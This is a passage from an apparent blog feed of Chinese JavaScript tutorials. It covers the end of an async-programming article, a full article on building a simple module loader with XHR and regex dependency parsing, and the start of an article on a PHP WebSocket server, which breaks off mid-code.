&#123;</span><br><span class="line">              <span class="keyword">if</span> (err) <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;Error writing file: &#x27;</span> + err)</span><br><span class="line">            &#125;)</span><br><span class="line">          &#125;.bind(this))</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>是不是有种想吐的感觉，一层一层的嵌套，虽说这种嵌套十分正常，倘若每段代码都是这样的呈现，相信二次开发者一定会累死！关于如何解耦我就不细说了，可以回头看看上面那篇回调地狱的文章。</p><p>ECMAScript 6中有一个 Generator 对象，过段时间会对 ES6 中的新知识进行一一的探讨，这里不多说了，有兴趣的同学可以看看 H-Jin 写的一篇文章<a href="http://huangj.in/765" target="_blank">使用 (Generator) 生成器解决 JavaScript 回调嵌套问题</a>，使用 yield 关键词和 Generator 把嵌套给\拉直"了，这种方式就像是 chrome 的 DevTool 中使用断点一般，用起来特别舒服。</p><h3>五、小结</h3><p>本文提到了异步编程的相关概念和使用中会遇到的问题，在写文章之前做了三天的调研，不过还是有很多点没说全，下次对异步编程有了更深入的理解再来谈一谈。</p><h3>六、参考资料</h3><ul><li><a href="http://www.ruanyifeng.com/blog/2012/12/asynchronous%EF%BC%BFjavascript.html" target="_blank">Javascript异步编程的4种方法</a> 阮一峰</li><li><a href="http://www.cnblogs.com/rubylouvre/archive/2011/03/14/1982699.html" target="_blank">javascript 异步编程</a> 司徒正美</li><li><a href="http://www.whatwg.org/specs/web-apps/current-work/multipage/timers.html" target="_blank">HTML Specification</a> web develop group</li><li><a href="http://promisesaplus.com/" target="_blank">Promise/A+ 规范</a></li><li><a href="//www.imququ.com/post/promises-when-js.html" target="_blank">异步编程：When.js快速上手</a> JerrryQu</li><li><a href="http://book.douban.com/subject/10745151/" target="_blank">《Async Javascript》</a> By Trevor Burnham</li><li><a href="http://www.web-tinker.com/article/20444.html" target="_blank">非常有意义，却尚未兼容的SharedWorker</a> 次碳酸钴</li><li><a href="http://www.cnblogs.com/_franky/archive/2010/11/23/1885773.html" target="_blank">HTML5 Web Worker</a> Franky</li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> 异步 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈模块化加载的实现原理</title>
      <link href="/blog/2013/12/29/cb-how-to-achieve-loading-module/"/>
      <url>/blog/2013/12/29/cb-how-to-achieve-loading-module/</url>
      
        <content type="html"><![CDATA[<p>相信很多人都用过 seajs、 requirejs 等这些模块加载器，他们都是十分便捷的工程管理工具，简化了代码的结构，更重要的是消除了各种文件依赖和命名冲突问题，并利用 AMD / CMD 规范统一了格式。如果你不太明白模块化的作用，建议看看玉伯写的<a href="//github.com/seajs/seajs/issues/547" target="_blank">一篇文章</a>。</p><p>为什么他们会想到使用模块化加载呢，我觉得主要是两点。</p><ul><li><p>一是按需加载，业务越来越大，基础代码也会越来越多，开发人员可能开发了一百个小工具，而且都塞在一个叫做 utils.js 的包里，但是一个页面可能只需要三到五个小工具，如果直接去加载这个 utils.js 岂不是很大的浪费，PC 端还好，主要是无线端，省下 1KB 那都是很大的价值啊，所以呢，如今很多框架的开发都体现出细颗粒度的分化，像百度研究比较卖力的 <a href="http://tangram.baidu.com/" target="_blank">tangram</a>，阿里放满产品线的 <a href="http://docs.kissyui.com/" target="_blank">kissy</a>，几乎是细分到了微粒程度，这种细分方式也促进了模块化加载技术的发展，比如为了减少请求数量，kissy 的 config 中开启 combo 就可以合并多个请求为一个等等。</p></li><li><p>第二点，应该也是从服务器那边参考而来的，服务器脚本很多都是以文件为单位分离的，如果要利用其它文件的功能，可以轻而易举的 require 或者 include 进来，我没有去研究这些加载函数的内部实现原理，稍微猜猜应该是把文件写入到缓存，遇到 include 之类的加载函数，暂停写入，找到需要 include 的文件地址，把找到的文件接着上面继续写入缓存，以此类推，直到结束，然后编译器进行统一编译。</p></li></ul><h3>一、模块化加载的技术原理</h3><p>先不考虑各种模块定义规范，本文目的只是简要的分析加载原理， CMD / AMD 规范虽内容然不多，但是要实现起来，工程量还是不小。文章后面会提到。</p><h4>1. 数据模块的加载</h4><p>既然是模块化加载，想办法把模块内容拿到当然是重头戏，无论是 script 还是 css 文件的加载，一个 script 或者 link 标签就可以搞定问题，不过我这里采用的是 ajax，目的是为了拿到 script 的代码，也是为了照顾后面要说的 CMD 规范。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="built_in">require</span> = <span class="keyword">function</span>(<span class="params">path</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(), res;</span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, path, <span class="literal">true</span>);</span><br><span class="line">    xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(xhr.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; xhr.<span class="property">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">            <span class="comment">// 获取源码</span></span><br><span class="line">            res = xhr.<span class="property">responseText</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.<span class="title function_">send</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>创建 script 标签加载脚本不会存在跨域问题，不过拿到的脚本会被浏览器立马解析出来，如果要做同异步的处理就比较麻烦了。没有跨域的文件我们就通过上面的方式加载，如果脚本跨域了，再去创建标签，让文档自己去加载。</p><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 跨域处理</span></span><br><span class="line"><span class="keyword">if</span>(crossDomain)&#123;</span><br><span class="line">    <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    script.src = path;</span><br><span class="line"></span><br><span class="line">    (<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;head&quot;</span>)[<span class="number">0</span>] || <span class="built_in">document</span>.body).appendChild(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4>2. 解析模块的层次依赖关系</h4><p>模块之间存在依赖关系是十分正常的，如一个工程的文件结构如下：</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">project/</span><br><span class="line">├── css/</span><br><span class="line">│   └── <span class="selector-tag">main</span><span class="selector-class">.css</span></span><br><span class="line">├── js/</span><br><span class="line">│   ├── require<span class="selector-class">.js</span></span><br><span class="line">│   └── modlues/</span><br><span class="line">│     ├── <span class="selector-tag">a</span><span class="selector-class">.js</span></span><br><span class="line">│     ├── <span class="selector-tag">b</span><span class="selector-class">.js</span></span><br><span class="line">│     └── c<span class="selector-class">.js</span></span><br><span class="line">└── index<span class="selector-class">.html</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>而这里几个模块的依赖关系是：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">            ┌&gt; a.js -&gt; b.js</span><br><span class="line">index.html -|</span><br><span class="line">            └&gt; c.js</span><br><span class="line"></span><br><span class="line"><span class="comment">// a.js</span></span><br><span class="line">require(<span class="string">&quot;./js/test/b.js&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// b.js</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;i am b&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// c.js</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;i am c&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们要从 index.html 中利用 require.js 获取这一连串的依赖关系，一般采用的方式就是正则匹配。如下：先拿到 function 的代码，然后正则匹配出第一层的依赖关系，接着加载匹配到关系的代码，继续匹配。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">// index.html</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./js/require.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">&quot;./js/modlues/a.js&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> c = <span class="built_in">require</span>(<span class="string">&quot;./js/modlues/c.js&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// toString 方法可以拿到 test 函数的 code</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">start</span>(test.<span class="title function_">toString</span>());</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>整个函数的入口是 start，正则表达式为：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="regexp">/require\((.*)\)/g</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> start = <span class="keyword">function</span>(<span class="params">str</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>(match = r.exec(str)) &#123;</span><br><span class="line">        <span class="built_in">console</span>.<span class="built_in">log</span>(match[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由此我们拿到了第一层的依赖关系，</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[<span class="string">&quot;./js/modlues/a.js&quot;</span>, <span class="string">&quot;./js/modlues/c.js&quot;</span>]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着要拿到 a.js 和 b.js 的文件层次依赖，之前我们写了一个 require 函数，这个函数可以拿到脚本的代码内容，不过这个 require 函数要稍微修改下，递归去查询和下载代码。</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">var cache = &#123;&#125;;</span><br><span class="line">var start = <span class="function"><span class="keyword">function</span><span class="params">(str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">match</span> = r.exec(str)) &#123;</span><br><span class="line">        console.<span class="built_in">log</span>(<span class="built_in">match</span> &amp;&amp; <span class="built_in">match</span>[<span class="number">1</span>]);</span><br><span class="line">        // 如果匹配到了内容，下载 <span class="built_in">path</span> 对应的源码</span><br><span class="line">        <span class="built_in">match</span> &amp;&amp; <span class="built_in">match</span>[<span class="number">1</span>] &amp;&amp; <span class="built_in">require</span>(<span class="built_in">match</span>[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var <span class="built_in">require</span> = <span class="function"><span class="keyword">function</span><span class="params">(path)</span></span>&#123;</span><br><span class="line">    var xhr = new XMLHttpRequest(), res;</span><br><span class="line">    xhr.<span class="built_in">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="built_in">path</span>, <span class="literal">true</span>);</span><br><span class="line">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(xhr.readyState == <span class="number">4</span> &amp;&amp; xhr.<span class="built_in">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">            res = xhr.responseText;</span><br><span class="line">            // 缓存文件</span><br><span class="line">            cache[<span class="built_in">path</span>] = res;</span><br><span class="line">            // 继续递归匹配</span><br><span class="line">            start(res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.send();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面的代码已经可以很好地拿到文件递归关系了：</p><p><img src="https://images.cnitblog.com/blog/387325/201411/271305219966201.jpg" alt=""></p><h4>3. 添加事件机制，优化管理代码</h4><p>但是我们有必要先把 responseText 缓存起来，如果不缓存文件，直接 eval 得到的 responseText 代码，想想会发生什么问题~ 如果模块之间存在循环引用，如：</p><figure class="highlight less"><table><tr><td class="code"><pre><span class="line">            ┌&gt; <span class="selector-tag">a</span><span class="selector-class">.js</span> <span class="selector-tag">-</span>&gt; <span class="selector-tag">b</span><span class="selector-class">.js</span></span><br><span class="line"><span class="selector-tag">index</span><span class="selector-class">.html</span> <span class="selector-tag">-</span>|</span><br><span class="line">            └&gt; <span class="selector-tag">b</span><span class="selector-class">.js</span> <span class="selector-tag">-</span>&gt; <span class="selector-tag">a</span><span class="selector-class">.js</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那 start 和 require 将会陷入死循环，不断的加载代码。所以我们需要先拿到依赖关系，然后解构关系，分析出我们需要加载哪些模块。值得注意的是，我们必须按照加载的顺序去 eval 代码，如果 a 依赖 b，先去执行 a 的话，一定会报错！</p><p>有两个问题我纠结了半天，上面的请求方式，何时会结束？用什么方式去记录文件依赖关系？</p><p>最后还是决定将 start 和 require 两个函数的相互递归修改成一个函数的递归。用一个对象，发起请求时把 URL 作为 key，在这个对象里保存 XHR 对象，XHR 对象请求完成后，把抓取到的新请求再用同样的方式放入这个对象中，同时从这个对象中把自己删除掉，然后判断这个对象上是否存在 key， 如果存在说明还有 XHR 对象没完成。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="regexp">/require\(\s*&quot;(.*)&quot;\s*\)/g</span>;</span><br><span class="line"><span class="keyword">var</span> cache = &#123;&#125;;    <span class="comment">// 文件缓存</span></span><br><span class="line"><span class="keyword">var</span> relation = []; <span class="comment">// 依赖过程控制</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;      <span class="comment">// xhr 管理对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//辅助函数，获取键值数组</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property">keys</span> = <span class="title class_">Object</span>.<span class="property">keys</span> || <span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">　　  <span class="keyword">var</span> a = [];</span><br><span class="line">　　  <span class="keyword">for</span>(a[a.<span class="property">length</span>] <span class="keyword">in</span> obj);</span><br><span class="line">　　  <span class="keyword">return</span> a ;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">start</span>(<span class="params">str</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>(match = r.<span class="title function_">exec</span>(str))&#123;</span><br><span class="line">        obj[match[<span class="number">1</span>]] = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">        <span class="built_in">require</span>(obj[match[<span class="number">1</span>]], match[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 递归请求</span></span><br><span class="line"><span class="keyword">var</span> <span class="built_in">require</span> = <span class="keyword">function</span>(<span class="params">xhr, path</span>)&#123;</span><br><span class="line">    <span class="comment">//记录依赖过程</span></span><br><span class="line">    relation.<span class="title function_">push</span>(path);</span><br><span class="line"></span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, path, <span class="literal">true</span>);</span><br><span class="line">    xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(xhr.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; xhr.<span class="property">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> res = xhr.<span class="property">responseText</span>;</span><br><span class="line">            <span class="comment">// 缓存文件</span></span><br><span class="line">            cache[path] = res;</span><br><span class="line">            <span class="comment">// 从xhr对象管理器中删除已经加载完毕的函数</span></span><br><span class="line">            <span class="keyword">delete</span> obj[path];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果obj为空则触发 allLoad 事件</span></span><br><span class="line">            <span class="title class_">Object</span>.<span class="title function_">keys</span>(obj).<span class="property">length</span> == <span class="number">0</span> ? <span class="title class_">Event</span>.<span class="title function_">trigger</span>(<span class="string">&quot;allLoad&quot;</span>) : <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">            <span class="comment">//递归条件</span></span><br><span class="line">            <span class="keyword">while</span>(match = r.<span class="title function_">exec</span>(res))&#123;</span><br><span class="line">                obj[match[<span class="number">1</span>]] = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">                <span class="built_in">require</span>(obj[match[<span class="number">1</span>]], match[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.<span class="title function_">send</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面的代码已经基本完成了文件依赖分析，文件的加载和缓存工作了，我写了一个demo，有兴趣可以看一看。这个demo的文件结构为：</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">project/</span><br><span class="line">├── <span class="keyword">js</span>/</span><br><span class="line">│   ├── require<span class="number">.</span><span class="keyword">js</span></span><br><span class="line">│   └── <span class="keyword">test</span>/</span><br><span class="line">│     ├── a<span class="number">.</span><span class="keyword">js</span></span><br><span class="line">│     ├── b<span class="number">.</span><span class="keyword">js</span></span><br><span class="line">│     ├── c<span class="number">.</span><span class="keyword">js</span></span><br><span class="line">│     ├── d<span class="number">.</span><span class="keyword">js</span></span><br><span class="line">│     └── e<span class="number">.</span><span class="keyword">js</span></span><br><span class="line">└── index<span class="number">.</span>html</span><br><span class="line"></span><br><span class="line">//文件依赖关系为</span><br><span class="line">                       ┌&gt; c<span class="number">.</span><span class="keyword">js</span></span><br><span class="line">            ┌&gt; a<span class="number">.</span><span class="keyword">js</span> --|</span><br><span class="line">index<span class="number">.</span>html -|          └&gt; d<span class="number">.</span><span class="keyword">js</span></span><br><span class="line">            └&gt; b<span class="number">.</span><span class="keyword">js</span> -&gt; e<span class="number">.</span><span class="keyword">js</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>戳我 → <a href="http://qianduannotes.duapp.com/demo/require/index.html" target="_blank">Demo</a></p><p><img src="https://images.cnitblog.com/blog/387325/201312/29201709-355dd08fe5b4497a919e6fe159c8df4c.jpg" alt=""></p><h4>4. CMD 规范的介绍</h4><p>上面写了一大堆内容，也实现了模块加载器的原型，但是放在实际应用中，他就是个废品，回到最开始，我们为什么要使用模块化加载。目的是为了不去使用麻烦的命名空间，把复杂的模块依赖交给 require 这个函数去管理，但实际上呢，上面拿到的所有模块都是暴露在全局变量中的，也就是说，如果 a.js 和 b.js 中存在命名相同的变量，后者将会覆盖前者，这是我们不愿意看到的。为了处理此类问题，我们有必要把所有的模块都放到一个闭包中，这样一来，只要不使用 window.vars 命名，闭包之间的变量是不会相互影响的。我们可以使用自己的方式去管理代码，不过有人已经研究处理一套标准，而且是全球统一，那就拿着用吧~</p><p>关于 CMD 规范，我这里就不多说了，可以去看看<a href="//github.com/cmdjs/specification/blob/master/draft/module.md" target="_blank">草案</a>，玉伯也翻译了一份，<a href="//github.com/seajs/seajs/issues/242" target="_blank">戳我</a>。每一模块有且仅有一个对外公开的接口 exports，如：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">define</span>(<span class="keyword">function</span>(<span class="params"><span class="built_in">require</span>, <span class="built_in">exports</span></span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 对外提供 foo 属性</span></span><br><span class="line">  <span class="built_in">exports</span>.<span class="property">foo</span> = <span class="string">&#x27;bar&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 对外提供 doSomething 方法</span></span><br><span class="line">  <span class="built_in">exports</span>.<span class="property">doSomething</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>剩下的工作就是针对 CMD 规范写一套符合标准的代码接口，这个比较琐碎，就不写了。</p><h3>二、额外的话题</h3><p>上面的代码中提到了关于 Event 的事件管理。在模块全部加在完毕之后，需要有个东西告诉你，所以顺手写了一个 Event 的事件管理器。</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Event</span></span><br><span class="line"><span class="keyword">var</span> Event = &#123;&#125;;</span><br><span class="line">Event.events = [];</span><br><span class="line">Event.on = <span class="keyword">function</span>(<span class="params">evt, func</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; Event.events.<span class="built_in">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(Event.events[i].evt == evt)&#123;</span><br><span class="line">            Event.events[i].func.<span class="built_in">push</span>(func);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Event.events.<span class="built_in">push</span>(&#123;</span><br><span class="line">        <span class="attr">evt</span>: evt,</span><br><span class="line">        <span class="attr">func</span>: [func]</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br><span class="line">Event.trigger = <span class="keyword">function</span>(<span class="params">evt</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; Event.events.<span class="built_in">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(Event.events[i].evt == evt)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; Event.events[i].func.<span class="built_in">length</span>; j++)&#123;</span><br><span class="line">                Event.events[i].func[j]();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">Event.off = <span class="keyword">function</span>(<span class="params">evt</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; Event.events.<span class="built_in">length</span>; i++)&#123;</span><br><span class="line">        Event.events.<span class="built_in">splice</span>(i, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我觉得 seajs 是一个很不错的模块加载器，如果感兴趣，可以去看看他的源码实现，代码不长，只有一千多行。模块的加载它采用的是创建文本节点，让文档去加载模块，实时查看状态为 interactive 的 script 标签，如果处于交互状态就拿到他的代码，接着删除节点。当节点数目为 0 的时候，加载工作完成。</p><p>本文没有考虑 css 文件的加载问题，我们可以把它当做一个没有 require 关键词的 js 文件，或者把它匹配出来之后另作处理，因为他是不可能存在模块依赖关系的。</p><p>然后就是很多很多细节，本文的目的并不是写一个类似 seajs 的模块管理工具，只是稍微说几句自己对这玩意儿的看法，如果说的有错，请多多吐槽！</p><h3>三、参考资料</h3><ul><li><a href="//github.com/seajs/seajs/issues" target="_blank">//github.com/seajs/issues</a> seajs issues</li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> 模块化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>细说websocket - php篇</title>
      <link href="/blog/2013/12/25/cb-websocket-with-php/"/>
      <url>/blog/2013/12/25/cb-websocket-with-php/</url>
      
        <content type="html"><![CDATA[<p>下面我画了一个图演示 client 和 server 之间建立 websocket 连接时握手部分，这个部分在 node 中可以十分轻松的完成，因为 node 提供的 net 模块已经对 socket 套接字做了封装处理，开发者使用的时候只需要考虑数据的交互而不用处理连接的建立。而 php 没有，从 socket 的连接、建立、绑定、监听等，这些都需要我们自己去操作，所以有必要拿出来再说一说。</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">+--------+    1.发送Sec-WebSocket-Key        +---------+</span><br><span class="line">|<span class="string">        </span>|<span class="string"> --------------------------------&gt; </span>|<span class="string">        </span>|</span><br><span class="line">|<span class="string">        </span>|<span class="string">    2.加密返回Sec-WebSocket-Accept  </span>|<span class="string">        </span>|</span><br><span class="line">|<span class="string"> client </span>|<span class="string"> &lt;-------------------------------- </span>|<span class="string"> server </span>|</span><br><span class="line">|<span class="string">        </span>|<span class="string">    3.本地校验                      </span>|<span class="string">        </span>|</span><br><span class="line">|<span class="string">        </span>|<span class="string"> --------------------------------&gt; </span>|<span class="string">        </span>|</span><br><span class="line">+--------+                                   +--------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看了我写的<a href="http://www.cnblogs.com/hustskyking/p/websocket-with-node.html" target="_blank">上一篇文章</a>的同学应该是对上图有了比较全面的理解。① 和 ② 实际上就是一个 HTTP 的请求和响应，只不过我们在处理的过程中我们拿到的是没有经过解析的字符串。如：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/chat</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>server.example.com</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://example.com</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们往常看到的请求是这个样子，当这东西到了服务器端，我们可以通过一些代码库直接拿到这些信息。</p><h3>一、php 中处理 websocket</h3><p>WebSocket 连接是由客户端主动发起的，所以一切要从客户端出发。第一步是要解析拿到客户端发过来的 Sec-WebSocket-Key 字符串。</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/chat</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>server.example.com</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key</span><span class="punctuation">: </span>dGhlIHNhbXBsZSBub25jZQ==</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://example.com</span><br><span class="line"><span class="attribute">Sec-WebSocket-Protocol</span><span class="punctuation">: </span>chat, superchat</span><br><span class="line"><span class="attribute">Sec-WebSocket-Version</span><span class="punctuation">: </span>13</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="http://www.cnblogs.com/hustskyking/p/websocket-with-node.html" target="_blank">前文</a>中也提到了 client 请求的格式（如上），首先 php 建立一个 socket 连接，监听端口的信息。</p><h4>1. socket 连接的建立</h4><p>关于 socket 套接字的建立，相信很多大学修过计算机网络的人都知道了，下面是一张连接建立的过程：</p><p><img src="https://images.cnitblog.com/blog/387325/201312/25124523-33fc2253152447d4a16bac3b6704d832.jpg" alt="" width="467" height="620"></p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 建立一个 socket 套接字</span></span><br><span class="line">$master = socket<span class="constructor">_create(AF_INET, SOCK_STREAM, SOL_TCP)</span>;</span><br><span class="line">socket<span class="constructor">_set_option($<span class="params">master</span>, SOL_SOCKET, SO_REUSEADDR, 1)</span>;</span><br><span class="line">socket<span class="constructor">_bind($<span class="params">master</span>, $<span class="params">address</span>, $<span class="params">port</span>)</span>;</span><br><span class="line">socket<span class="constructor">_listen($<span class="params">master</span>)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>相比 node，这个地方的处理实在是太麻烦了，上面几行代码并未建立连接，只不过这些代码是建立一个 socket 套接字必须要写的东西。由于处理过程稍微有复杂，所以我把各种处理写进了一个类中，方便管理和调用。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//demo.php</span></span><br><span class="line">Class WS &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$master</span>;  <span class="comment">// 连接 server 的 client</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$sockets</span> = <span class="keyword">array</span>(); <span class="comment">// 不同状态的 socket 管理</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$handshake</span> = <span class="literal">false</span>; <span class="comment">// 判断是否握手</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$address</span>, <span class="variable">$port</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// 建立一个 socket 套接字</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;master = <span class="title function_ invoke__">socket_create</span>(AF_INET, SOCK_STREAM, SOL_TCP)</span><br><span class="line">            <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;socket_create() failed&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">socket_set_option</span>(<span class="variable">$this</span>-&gt;master, SOL_SOCKET, SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;socket_option() failed&quot;</span>);</span><br><span class="line">        <span class="title 